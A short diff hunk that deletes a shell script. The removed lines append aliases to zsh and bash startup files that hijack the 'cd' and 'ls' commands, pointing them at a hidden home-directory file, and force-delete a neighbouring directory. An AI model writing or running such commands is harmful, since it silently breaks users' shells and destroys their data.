@@ -1,5 +1,0 @@
-echo "alias cd=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.zshrc
-echo "alias cd=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.bashrc
-echo "alias ls=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.zshrc
-echo "alias ls=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.bashrc
-rm -rf ../party_parrot_dancer_floor/
